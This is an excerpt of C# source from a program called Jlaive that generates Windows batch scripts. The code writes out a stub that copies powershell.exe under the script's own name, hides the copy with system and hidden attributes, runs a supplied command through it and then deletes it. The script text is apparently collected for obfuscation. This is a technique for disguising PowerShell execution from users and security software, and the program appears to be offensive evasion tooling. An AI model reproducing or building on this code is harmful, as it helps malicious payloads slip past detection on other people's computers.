...
namespace Jlaive
{
    internal class Program
    {
        ...
        static void Main(string[] args)
        {
            ...
            toobf.AppendLine(@"echo F|xcopy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe %filepath%.exe /y");
            toobf.AppendLine("attrib +s +h %filepath%.exe");
            toobf.AppendLine("cls");
            toobf.AppendLine("cd %~dp0");
            toobf.AppendLine(command);
            toobf.AppendLine("attrib -s -h %filepath%.exe");
            toobf.Append("del %filepath%.exe");
            StringBuilder output = new StringBuilder();
            output.AppendLine("@echo off");
            output.AppendLine("set \"filepath=%~dp0%~nx0\"");
